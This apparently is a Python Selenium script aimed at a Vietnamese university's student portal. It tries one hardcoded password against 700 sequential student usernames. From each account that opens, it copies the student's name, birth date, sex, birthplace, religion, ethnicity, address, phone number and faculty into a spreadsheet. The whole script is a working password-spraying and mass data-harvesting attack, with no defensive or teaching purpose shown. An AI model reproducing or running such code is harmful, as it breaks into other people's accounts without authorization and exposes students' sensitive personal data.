from selenium import webdriver
#import xlsxwriter
import pandas as pd
import openpyxl

driver=webdriver.Chrome(executable_path="C:\\Users\\Admin\\Desktop\\chromedriver_win32\\chromedriver.exe")
#driver.get("https://sam.doantn.hcmus.edu.vn/auth/login/")
Username="21127"
pswd="26031931"
Epath="21CLCIT.xlsx"

#workbook=xlsxwriter.Workbook(Epath)
#worksheet=workbook._add_sheet("Sheng")
count=1
data=[]
def check_exists_by_xpath(xpath):
    try:
        webdriver.find_element_by_xpath(xpath)
    except:
        return False
    return True
def output_Excel(input_detail,output_excel_path):
  #Xác định số hàng và cột lớn nhất trong file excel cần tạo
  row = len(input_detail)
  column = len(input_detail[0])

  #Tạo một workbook mới và active nó
  wb = openpyxl.Workbook()
  ws = wb.active
  
  #Dùng vòng lặp for để ghi nội dung từ input_detail vào file Excel
  for i in range(0,row):
    for j in range(0,column):
      v=input_detail[i][j]
      ws.cell(column=j+1, row=i+1, value=v)

  #Lưu lại file Excel
  wb.save(output_excel_path)
for i in range(700):
    driver.get("https://sam.doantn.hcmus.edu.vn/auth/login/")
    driver.implicitly_wait(10)
    login=driver.find_element_by_xpath("//*[@id='loginUsername']")
    login.clear()
    login.send_keys(Username+"0"*(3-len(str(i)))+str(i))
    password=driver.find_element_by_xpath("//*[@id='loginPassword']")
    password.clear()
    password.send_keys(pswd)
    driver.find_element_by_xpath("//*[@id='formLogin']/div[4]/input").click()
    driver.implicitly_wait(30)
    if(check_exists_by_xpath("//*[@id='formLoginMessage']/div")):
        continue  
    try:
        driver.implicitly_wait(10)
        driver.find_element_by_xpath('//*[@id="navbarCollapse"]/ul[2]/li[2]/a').click()
        driver.find_element_by_xpath("//*[@id='navbarCollapse']/ul[2]/li[2]/div/a[1]").click()
        driver.implicitly_wait(10)
        MSSV=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[1]/div/div/div/b").text
        Name=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[2]/div/h1").text
        birth=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[3]/div/div/div").text
        Sex=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[2]/div/div/div").text
        Noisinh=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[4]/div/div/div").text
        TonGiao=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[6]/div/label").text
        Dantoc=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[1]/div[5]/div/div/div").text
        Address=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[2]/div[1]/div/div/div").text
        Phone_number=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[2]/div[4]/div/div/div").text
        Khoa=driver.find_element_by_xpath("/html/body/div/div[2]/div/div[3]/div[2]/div/div/div[4]/div/div/div/div").text
        driver.find_element_by_xpath("//*[@id='navbarCollapse']/ul[2]/li[2]/a").click()
        driver.find_element_by_xpath("//*[@id='navbarCollapse']/ul[2]/li[2]/div/a[3]").click()
        data.append([MSSV,Name,birth,Sex,Noisinh,TonGiao,Dantoc,Address,Phone_number,Khoa])
        #output_Excel([MSSV,Name,birth,Sex,Noisinh,TonGiao,Dantoc,Address,Phone_number,Khoa],Epath)

        #worksheet.write('A'+str(count),MSSV)
        #worksheet.write('B'+str(count),Name)
        #worksheet.write('C'+str(count),birth)
        #worksheet.write('D'+str(count),Sex)
        #worksheet.write('E'+str(count),Noisinh)
        #worksheet.write('F'+str(count),TonGiao)
        #worksheet.write('G'+str(count),Dantoc)
        #worksheet.write('H'+str(count),Address)
        #worksheet.write('J'+str(count),Phone_number)
        #worksheet.write('K'+str(count),Khoa)
    except:
        continue

df = pd.DataFrame(data,
columns=['MSSV','Name','birth','Sex','Noisinh','TonGiao','Dantoc','Address','Phone_number','Khoa'])
df.to_excel(Epath, sheet_name='new_sheet_name')




#class Booking(webdriver.Chrome):
#    def __init__(self, driver_path=r"C:\SeleniumDrivers",
#                 teardown=False):
#        self.driver_path = driver_path
#        self.teardown = teardown
#        os.environ['PATH'] += self.driver_path
#        super(Booking, self).__init__()

#    def __exit__(self, exc_type, exc_val, exc_tb):
#        if self.teardown:
#            self.quit()

    #def land_first_page(self):
    #    self.get(const.BASE_URL)

#driver.implicitly_wait(5)
